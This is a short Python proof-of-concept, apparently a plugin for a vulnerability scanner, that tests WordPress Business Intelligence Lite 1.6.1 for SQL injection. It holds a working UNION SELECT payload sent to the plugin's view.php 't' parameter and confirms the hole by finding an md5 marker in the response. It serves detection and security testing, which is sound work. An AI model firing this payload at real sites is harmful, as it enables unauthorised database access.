#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  WordPress Business Intelligence Lite 1.6.1 SQL Injection
References:  http://packetstormsecurity.com/files/131228/wpbusinessintelligence-sql.txt
Author    :  a
mail      :  a@lcx.cc
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):   
    payload = "wp-content/plugins/wp-business-intelligence/view.php?t=1337+union+select+1,2,3,md5(521521),5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in res:   	
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://127.0.0.1/')[1])